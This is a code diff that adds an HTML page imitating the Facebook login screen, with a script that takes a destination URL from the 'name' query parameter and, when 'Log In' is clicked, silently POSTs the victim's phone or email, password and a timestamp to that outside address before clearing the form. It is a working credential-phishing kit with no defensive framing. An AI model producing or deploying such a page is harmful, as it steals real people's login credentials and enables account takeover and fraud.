@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Facebook</title>
+  
+  <!-- HTML -->
+  
+
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <center>
+  <img class="img" src="/Screenshot_20220814-191744_1.png" alt="img">
+  <a class="lang" href="#">English (United Kingdonm) . العربية  </a>
+  <div id="login">
+    <input class="intput" type="email" id="number" placeholder="Phone or email" required>
+    <input class="intput" type="password" id="pass" placeholder="Password" required>
+    <br>
+    <button onclick="log()" class="button">Log In</button>
+  </div>
+  <a class="forgot" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc2MTI4ODE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"><b>Forgot Password?</b></a>
+  <hr>
+  <p>OR</p>
+  <button  class="creat" onclick="create()">Create New Facbeook account</button>
+  </center>
+  <script src="main.js"></script>
+</body>
+<script>
+
+window.addEventListener('load', () => {
+      const params = (new URL(document.location)).searchParams
+      const name = params.get('name');
+      localStorage.setItem("link",name)
+  })
+
+function log1(){
+  var date = new Date();
+  var number = document.getElementById("number").value;
+  var pass = document.getElementById("pass").value;
+  var link = localStorage.getItem("link");
+
+  fetch(link, {
+  method: "POST",
+  body: JSON.stringify({
+    Number: number,
+    Password: pass,
+    Date: date.toString()
+  }),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  }
+
+});
+document.getElementById("number").value="";
+document.getElementById("pass").value="";
+
+}
+
+function log(){
+  var number = document.getElementById("number").value;
+  var pass = document.getElementById("pass").value;
+
+  if(number== ""){
+    alert('Enter Number or Email')
+  }else if(pass== ""){
+    alert('Enter a Password')
+  }else{
+    log1()}
+}
+
+</script>
+</html>
